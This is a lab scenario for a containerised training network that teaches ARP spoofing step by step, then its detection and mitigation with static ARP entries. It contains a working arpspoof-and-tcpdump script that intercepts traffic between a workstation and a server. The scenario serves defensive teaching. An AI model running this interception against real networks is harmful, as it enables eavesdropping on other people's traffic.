## ARP Spoofing in the IT Network

### Topology

Three containers on the IT segment, connected via a single Open vSwitch (ovs-it):

| Node             | Role       | Image         | IP Address     | Notes                        |
|------------------|------------|---------------|----------------|------------------------------|
| IT-Server        | Target     | Ubuntu/Alpine | 192.168.1.1    | Runs nginx (HTTP)            |
| IT-Workstation   | Victim     | Ubuntu/Alpine | 192.168.1.10   | Legitimate client            |
| Malicious-Client | Attacker   | Ubuntu         | 192.168.1.20   | Needs dsniff, tcpdump        |

All three nodes connect to `ovs-it` on the same VLAN/subnet (192.168.1.0/24).

### Prerequisites (container setup scripts)

**IT-Server setup** (`setup_server.sh` — inject at deploy time):
```bash
#!/bin/bash
apt-get update && apt-get install -y nginx net-tools
service nginx start
echo "<h1>IT-Server is running</h1>" > /var/www/html/index.html
```

**IT-Workstation setup** (`setup_workstation.sh`):
```bash
#!/bin/bash
apt-get update && apt-get install -y curl net-tools tcpdump
```

**Malicious-Client setup** (`setup_attacker.sh`):
```bash
#!/bin/bash
apt-get update && apt-get install -y dsniff tcpdump net-tools
```

### Step-by-Step Scenario

#### Step 1: Verify baseline connectivity

On **IT-Workstation**:
```bash
# Confirm HTTP works
curl http://192.168.1.1

# Check current ARP table
arp -a

# Note the MAC address for 192.168.1.1 — this is the correct one
```

On **IT-Server**:
```bash
# Confirm ARP table
arp -a

# Note the MAC address for 192.168.1.10
```

#### Step 2: Launch the ARP spoofing attack

On **Malicious-Client** — deploy this as a single script via the AE3GIS script injection interface:

**`arp_spoof_attack.sh`**:
```bash
#!/bin/bash
# Enable IP forwarding so intercepted packets still reach their destination
echo 1 > /proc/sys/net/ipv4/ip_forward

# Spoof: tell Workstation that we are the Server
arpspoof -i eth0 -t 192.168.1.10 192.168.1.1 &
SPOOF_PID1=$!

# Spoof: tell Server that we are the Workstation
arpspoof -i eth0 -t 192.168.1.1 192.168.1.10 &
SPOOF_PID2=$!

echo "ARP spoofing active (PIDs: $SPOOF_PID1, $SPOOF_PID2)"
echo "Run 'kill $SPOOF_PID1 $SPOOF_PID2' to stop"

# Start capturing traffic (optional — captures to file for later analysis)
tcpdump -i eth0 -w /tmp/captured_traffic.pcap &
echo "Packet capture running in background"

wait
```

#### Step 3: Observe the attack

On **IT-Workstation**:
```bash
# Check ARP table again — the MAC for 192.168.1.1 should now be the attacker's MAC
arp -a

# Generate some traffic to the server
curl http://192.168.1.1
curl http://192.168.1.1
```

On **Malicious-Client**:
```bash
# Watch intercepted traffic live
tcpdump -i eth0 -A port 80

# You should see the HTTP requests from Workstation to Server passing through
```

On **IT-Workstation** (to see the forged ARP replies):
```bash
# Watch ARP traffic
tcpdump -i eth0 arp

# You'll see unsolicited ARP replies from the attacker's MAC claiming to be 192.168.1.1
```

#### Step 4: Detect the attack

On **IT-Workstation**:
```bash
# Detection method 1: ARP table inspection
# Compare current ARP entry for 192.168.1.1 with the known-good MAC
arp -a
# The MAC for 192.168.1.1 should NOT match the real server's MAC

# Detection method 2: Watch for multiple ARP replies
tcpdump -i eth0 -c 20 arp
# Look for: frequent, unsolicited "is-at" replies for 192.168.1.1
# coming from a MAC that isn't the server's real MAC
```

#### Step 5: Mitigate the attack

On **IT-Workstation**:
```bash
# Get the REAL MAC address of the server (from before the attack, or ask the admin)
# For this exercise, assume the real MAC is aa:bb:cc:dd:ee:01

# Set a static ARP entry
arp -s 192.168.1.1 aa:bb:cc:dd:ee:01
```

On **IT-Server**:
```bash
# Also set static ARP for the workstation
arp -s 192.168.1.10 aa:bb:cc:dd:ee:10
```

#### Step 6: Verify mitigation

On **IT-Workstation**:
```bash
# ARP table should now show the static entry (flag: CM or PERM)
arp -a

# Generate traffic again
curl http://192.168.1.1
```

On **Malicious-Client**:
```bash
# Traffic capture should no longer show HTTP traffic from workstation to server
tcpdump -i eth0 -A port 80
# (nothing, or only the attacker's own traffic)
```

#### Cleanup
```bash
# On attacker — stop spoofing
kill $SPOOF_PID1 $SPOOF_PID2
echo 0 > /proc/sys/net/ipv4/ip_forward
```


---

## Notes for Scenario Documentation

- This scenario uses the same three-node topology. They can be packaged as a single AE3GIS topology template with two separate scenario documents.
- The setup scripts (package installation) should ideally be baked into the container images. If not, they can be injected at deploy time using AE3GIS's script injection.
- The attack scripts are designed to be deployed through the AE3GIS script injection interface during the lab.
- MAC addresses in the ARP scenario will vary per deployment. The scenario docs should instruct students to record the real MACs before the attack begins.
- hping3 requires root/NET_ADMIN capabilities. Docker containers in GNS3 typically run as root, so this should work by default.
- The `--rand-source` flag in hping3 may not work in all container network configurations. If it causes issues, remove it — the attack works fine with the real source IP (and it makes detection easier, which is fine for educational purposes).